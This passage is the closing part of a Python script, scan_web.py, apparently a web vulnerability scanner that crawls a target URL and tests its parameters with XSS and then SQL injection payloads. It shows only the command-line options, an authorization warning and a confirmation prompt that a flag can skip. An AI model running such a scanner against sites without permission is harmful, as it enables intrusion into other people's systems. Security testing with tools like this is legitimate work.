    print(f"  SQLi indicators: {len(overall_sqli)} (details appended to result file)")
    print(f"  Output file: {outpath}")

# ---------- CLI ----------
def main():
    parser = argparse.ArgumentParser(description="Ordered per-parameter tester (XSS then SQLi). Output auto to ./result/<host>.txt")
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan (query string not required; crawler will discover inputs when enabled)')
    parser.add_argument('-y', '--yes', action='store_true', help='Auto-confirm authorization prompt (non-interactive)')
    parser.add_argument('--no-enrich', action='store_true', help='Disable NVD/CWE enrichment (enabled by default)')
    parser.add_argument('--no-crawl', action='store_true', help='Disable crawling; only test parameters in the provided URL')
    parser.add_argument('--crawl-pages', type=int, default=8, help='Maximum pages to crawl when gathering inputs (default: 8)')
    parser.add_argument('--timeout', type=int, default=12, help='Request timeout in seconds (default: 12)')
    parser.add_argument('--max-sqli', type=int, default=0, help='Limit number of SQLi payloads to use (0 = no limit)')
    parser.add_argument('--max-xss', type=int, default=0, help='Limit number of XSS payloads to use (0 = no limit)')
    args = parser.parse_args()

    try:
        print(color(BANNER, C.BOLD))
    except Exception:
        print(BANNER)

    print(color("🚨 scan_web.py — Ordered XSS then SQLi (auto-result)", C.BOLD))
    print(color("[!] WARNING: This tool sends HTTP requests. Run only on targets you are authorized to test.", C.RED))

    global CRAWL_ENABLED, CRAWL_PAGES, REQUEST_TIMEOUT, MAX_SQLI, MAX_XSS
    CRAWL_ENABLED = not bool(getattr(args, 'no_crawl', False))
    CRAWL_PAGES = int(getattr(args, 'crawl_pages', CRAWL_PAGES))
    REQUEST_TIMEOUT = int(getattr(args, 'timeout', REQUEST_TIMEOUT))
    MAX_SQLI = None if getattr(args, 'max_sqli', 0) == 0 else int(getattr(args, 'max_sqli'))
    MAX_XSS = None if getattr(args, 'max_xss', 0) == 0 else int(getattr(args, 'max_xss'))

    if not args.yes:
        confirm = input("Do you confirm you have authorization to test this target? Type 'yes' to continue: ").strip().lower()
        if confirm != 'yes':
            print(color("Aborted: authorization not confirmed.", C.RED))
            sys.exit(1)

    scan_ordered(args.url)

if __name__ == '__main__':
    main()
